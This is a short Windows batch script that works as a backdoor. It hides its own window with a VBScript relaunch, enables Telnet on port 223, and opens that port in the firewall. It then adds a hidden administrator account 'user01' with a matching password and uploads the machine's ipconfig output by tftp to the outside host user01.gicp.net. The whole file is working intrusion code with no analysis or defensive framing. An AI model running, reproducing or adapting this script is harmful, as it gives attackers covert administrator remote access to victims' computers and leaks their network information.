
::***********************************************************************

@echo off

if "%1" neq "1" (
>"%temp%\tmp.vbs" echo set WshShell = WScript.CreateObject^(^"WScript.Shell^"^) 
>>"%temp%\tmp.vbs" echo WshShell.Run chr^(34^) ^& %0 ^& chr^(34^) ^& ^" 1^",0 
start /d "%temp%" tmp.vbs 
exit 
) 

::start telnet
set myport=223
sc config TlntSvr start= auto
net start TlntSvr 
tlntadmn config port %myport%
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v %myport%:TCP /t reg_sz /d %myport%:TCP:*:Enabled:telnet /f

::add hide user
set myuser=user01
set mypw=user01
net user %myuser% %mypw% /add
net user %myuser% %mypw%
net localgroup administrators %myuser% /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %myuser% /t reg_dword /d 00000000 /f

::tell me ip
ipconfig/flushdns
ipconfig/all>aa.txt
tftp -i user01.gicp.net put aa.txt myip.txt